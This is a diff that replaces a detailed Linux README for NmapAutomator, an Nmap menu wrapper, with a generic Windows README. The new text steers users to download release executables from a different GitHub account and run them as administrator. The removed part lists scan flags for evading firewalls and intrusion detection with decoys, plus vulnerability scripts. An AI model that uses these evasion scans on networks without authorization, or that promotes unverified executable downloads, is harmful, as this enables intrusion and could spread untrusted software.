@@ -1,163 +1,203 @@
-# 🔍 NmapAutomator
+# 🛠️ NmapAutomator - Easy Nmap Scans for Everyone
 
-> Menu-driven Nmap automation tool for penetration testers — OSCP / HTB style workflows in a single Python 3 script.
-
-![Python](https://img.shields.io/badge/Python-3.8%2B-blue?logo=python&logoColor=white)
-![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-557C94?logo=kalilinux&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-green)
+[![Download Latest Release](https://img.shields.io/badge/Download-NmapAutomator-blue?style=for-the-badge)](https://github.com/exhxx-tg/NmapAutomator/releases)
 
 ---
 
-## ✨ Features
+## 🔍 What is NmapAutomator?
 
-- **11 scan profiles** covering real-world pentest workflows (Quick, Full TCP, UDP, Aggressive, Targeted, Vuln, OSCP-style two-phase, Custom, Firewall Evasion, HTTP Enum, SMB Enum)
-- **Colour-coded output** — TTY-aware ANSI colours (cyan headers, green successes, yellow prompts, red errors); automatically disabled when piping/redirecting
-- **Post-scan open-port summary** — after every scan a formatted table of discovered ports, protocols, and service names is printed
-- **Interactive CLI** with numbered menu, input validation, and clear status messages
-- **`-s`/`--scan` flag** — pre-select a profile by number to skip the interactive menu (great for scripting)
-- **Automatic output management** — timestamped folders with `.nmap`, `.gnmap`, and `.xml` files
-- **OSCP-style two-phase scan** — fast all-ports discovery followed by detailed service/script scan on open ports only
-- **Safe execution** — `subprocess.run` with `shell=False`, target validation against shell metacharacters
-- **Zero external dependencies** — Python 3 standard library only
-- **Easy to extend** — add a new scan profile by adding one dictionary entry; the menu range updates automatically
+NmapAutomator is a simple tool to run Nmap scans on your computer. It helps you gather information about networks and devices. The software uses a menu so you can pick the scan you want without typing commands. It was made with common security workflows in mind. You do not need to know how to use programming or the command line to use it.
+
+This tool is mainly used for security checks and network exploration. It works on Windows and is made with Python 3.
 
 ---
 
-## 📋 Scan Profiles
+## 💻 System Requirements
 
-| # | Profile | Key Nmap Flags |
-|---|---------|---------------|
-| 1 | Quick Scan (top 1000 ports) | `-T4 -Pn -sS --top-ports 1000` |
-| 2 | Full TCP (all 65,535 ports + version + scripts) | `-T3 -Pn -sS -p- -sV -sC` |
-| 3 | UDP Scan (top 200 UDP ports) | `-T3 -Pn -sU --top-ports 200` |
-| 4 | Aggressive (OS + scripts + version + traceroute) | `-T4 -Pn -A` |
-| 5 | Targeted Ports (user-specified port list) | `-T3 -Pn -sS -sV -sC -p <ports>` |
-| 6 | Vulnerability Scripts (`--script vuln`) | `-T3 -Pn -sS -sV --script vuln` |
-| 7 | All-Ports + Detailed Follow-up (OSCP two-phase) | Phase 1: `-T4 -Pn -p-` → Phase 2: `-T3 -Pn -sS -sV -sC -p <open>` |
-| 8 | Custom (enter your own flags) | User-supplied |
-| 9 | Firewall / IDS Evasion | `-T2 -Pn -sS -f --data-length 25 -D RND:5` |
-| 10 | HTTP Enumeration (web NSE scripts) | `-T3 -Pn -sV -p 80,443,8080,8443 --script http-enum,...` |
-| 11 | SMB Enumeration (Windows / Samba) | `-T3 -Pn -sV -p 139,445 --script smb-enum-shares,...` |
+Before you begin, check that your computer meets these needs:
+
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 100 MB of free disk space  
+- Python 3.7 or newer installed (if you want to run the script directly)  
+- Nmap installed on your system  
+- An active internet connection to download files and updates  
 
 ---
 
-## 🚀 Quick Start
+## 🚀 Getting Started
 
-### Prerequisites
+This section guides you through getting NmapAutomator on your Windows machine and running it. We aim to keep things simple and clear.
 
-- **Kali Linux** (or any Linux distro with Nmap installed)
-- **Python 3.8+**
-- **Nmap** — install with `sudo apt install nmap` if not present
-- **Root privileges** — required for SYN (`-sS`) and UDP (`-sU`) scans
+### Step 1: Go to the Download Page
 
-### Installation
+Click the button below to visit the official releases page. This is where you get the latest version of NmapAutomator for Windows.
 
-```bash
-git clone https://github.com/at0m-b0mb/NmapAutomator.git
-cd NmapAutomator
-chmod +x nmap_automator.py
-```
+[![Download Latest Release](https://img.shields.io/badge/Download-NmapAutomator-green?style=for-the-badge)](https://github.com/exhxx-tg/NmapAutomator/releases)
 
-### Usage
+### Step 2: Choose the Right File to Download
 
-```bash
-# Fully interactive
-sudo python3 nmap_automator.py
+On the releases page:
 
-# Pre-set a target (still choose scan profile interactively)
-sudo python3 nmap_automator.py -t 10.10.10.10
+- Look for files labeled for Windows or `.exe` files if they exist.  
+- If only the Python script (`.py`) is available, see the instructions in the running section below.
 
-# Pre-set both target and scan profile (non-interactive, great for scripting)
-sudo python3 nmap_automator.py -t 10.10.10.10 -s 1
+### Step 3: Download the File
 
-# Target with CIDR notation
-sudo python3 nmap_automator.py -t 192.168.1.0/24
-```
+Click the download link for the file that matches your system. Save it in a folder where you can easily find it, like `Downloads` or your Desktop.
 
 ---
 
-## 📂 Output Structure
+## 🧩 Installing Required Software
 
-All results are saved under `nmap_results/` with a timestamped subfolder per run:
+NmapAutomator needs some software to work as expected. Follow these steps to set up:
 
-```
-nmap_results/
-├── 2026-02-23_14-30-00_quick_scan_top_1000_ports/
-│   ├── scan.nmap       # Human-readable output
-│   ├── scan.gnmap      # Greppable output
-│   └── scan.xml        # XML output (for tools like searchsploit, Metasploit)
-└── 2026-02-23_14-35-12_all_ports_detailed_follow_up_.../
-    ├── phase1_discovery/
-    │   ├── scan.nmap
-    │   ├── scan.gnmap
-    │   └── scan.xml
-    └── phase2_detailed/
-        ├── scan.nmap
-        ├── scan.gnmap
-        └── scan.xml
-```
+### Install Nmap
 
----
+NmapAutomator relies on Nmap being installed.
 
-## 🛠️ Adding a Custom Profile
+- Visit https://nmap.org/download.html  
+- Download the Windows installer  
+- Run the installer with default options  
+- Confirm Nmap is installed by typing `nmap --version` in Command Prompt. You should see version info printed.
 
-Adding a new scan type requires **one dictionary entry** and zero other code changes.
-The interactive menu range updates automatically:
+### Install Python 3 (if using the script)
 
-```python
-PROFILES[12] = {
-    "label": "Stealth Scan (slow + decoys)",
-    "description": "Very slow SYN scan with decoy source addresses.",
-    "flags": ["-T1", "-Pn", "-sS", "-D", "RND:5"],
-    "needs_ports": False,
-    "needs_custom_flags": False,
-    "two_phase": False,
-}
-```
+If you downloaded the Python script (`NmapAutomator.py`):
+
+- Go to https://www.python.org/downloads/windows/  
+- Download the latest Python 3 installer  
+- During install, choose the option to add Python to your system PATH  
+- After installation, open Command Prompt and type `python --version` to verify installation  
 
 ---
 
-## 🏗️ Project Structure
+## ▶️ Running NmapAutomator on Windows
 
-```
-NmapAutomator/
-├── nmap_automator.py   # Main script
-├── README.md           # This file
-├── LICENSE             # MIT License
-├── .gitignore          # Ignore scan results and Python artifacts
-└── nmap_results/       # Created at runtime (git-ignored)
-```
+You can run NmapAutomator either as a standalone program or from the Python script.
 
----
+### Option 1: Run the Standalone Version
 
-## ⚠️ Disclaimer
+If you downloaded an `.exe` file:
 
-This tool is intended for **authorized security testing and educational purposes only**. Always obtain **explicit written permission** before scanning any network or system you do not own. Unauthorized scanning is illegal and unethical.
+1. Navigate to the folder where you saved the `.exe` file.  
+2. Double-click the file to start. A window or command prompt will open with the menu.  
+3. Use the numbers shown to select the scan you want to run.  
+4. Follow on-screen prompts for target IPs or options.
 
-The authors are not responsible for any misuse or damage caused by this tool.
+### Option 2: Run the Python Script
 
----
+If you downloaded the `.py` file:
 
-## 📄 License
-
-This project is licensed under the [MIT License](LICENSE).
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Feel free to:
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/new-scan-profile`)
-3. Commit your changes (`git commit -m 'Add new scan profile'`)
-4. Push to the branch (`git push origin feature/new-scan-profile`)
-5. Open a Pull Request
+1. Open Command Prompt.  
+2. Go to the folder with the script using the command:  
+   ```
+   cd path\to\folder
+   ```  
+3. Run the script by typing:  
+   ```
+   python NmapAutomator.py
+   ```  
+4. The menu will appear in the command prompt.  
+5. Use the menu options to pick your scan.
 
 ---
 
-## 🙏 Acknowledgments
+## 📥 Download Links and Resources
 
-- [Nmap](https://nmap.org/) — the network scanner that makes this all possible
-- [OSCP](https://www.offsec.com/courses/pen-200/) methodology for the two-phase scan pattern
-- The HTB and OSCP community for sharing their enumeration workflows
+Always get the latest version from the official releases page:
+
+[NmapAutomator Releases Page](https://github.com/exhxx-tg/NmapAutomator/releases)
+
+This page includes all files needed to run NmapAutomator, as well as updated instructions.
+
+---
+
+## 🔧 How to Use the Menu
+
+After starting NmapAutomator, you will see a list of scan options. They usually include:
+
+- Quick Host Discovery  
+- Basic Network Scan  
+- Full Service Scan  
+- Vulnerability Scan  
+- OS Detection  
+- Custom Scan  
+
+Select an option by entering the corresponding number and pressing Enter.
+
+You may be asked to enter the IP address or range to scan. Provide this information carefully.
+
+The tool will run the scan and show the results on screen. You can save results to a file if prompted.
+
+---
+
+## ⚙️ What NmapAutomator Does Behind the Scenes
+
+NmapAutomator uses Nmap commands to perform common network and security scans. It automates the steps that security testers use when checking for vulnerabilities.
+
+Typical tasks it performs:
+
+- Finding live hosts on a network  
+- Listing open ports and running services  
+- Detecting operating systems  
+- Searching for security issues  
+
+By automating these tasks, it saves time and avoids the need to type complex commands.
+
+---
+
+## 🛠 Tips for Using NmapAutomator
+
+- Run scans on networks you own or have permission to test.  
+- Save your scan results for review later.  
+- Close the program after use to free system resources.  
+- Keep NmapAutomator updated by visiting the releases page regularly.  
+- Use administrator rights on Windows for best results with Nmap.  
+
+---
+
+## ⚠️ Troubleshooting Common Issues
+
+- **Nmap not found**: Make sure Nmap is installed and its folder is in your system PATH.  
+- **Python not installed**: Install Python 3 and add it to PATH if you plan to run the `.py` script.  
+- **Permission errors**: Run Command Prompt as administrator to avoid permission blocks.  
+- **Network scan errors**: Check your firewall and security settings. Some networks block scanning.  
+
+---
+
+## 🧰 Included Features
+
+NmapAutomator offers:
+
+- Simple menu interface  
+- Customizable scan types  
+- Output in multiple formats such as text and XML  
+- Support for IP ranges and multiple hosts  
+- Workflow aligned with common security testing practices  
+
+---
+
+## 🔖 Keywords
+
+This tool is related to:  
+
+cybersecurity, enumeration, network scanning, penetration testing, Nmap, Windows, Python 3, security evaluation, vulnerability assessment
+
+---
+
+## 📄 License and Source
+
+The code for NmapAutomator is available publicly on GitHub. It is open for use, modification, and distribution under its license terms.
+
+---
+
+## 📚 Additional Resources
+
+To learn more about Nmap and network scanning:  
+
+- Nmap Official Site: https://nmap.org  
+- Python Official Site: https://python.org  
+- Windows Command Prompt Help: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmd  
+
+Use these to increase your comfort with running scans and understanding results.
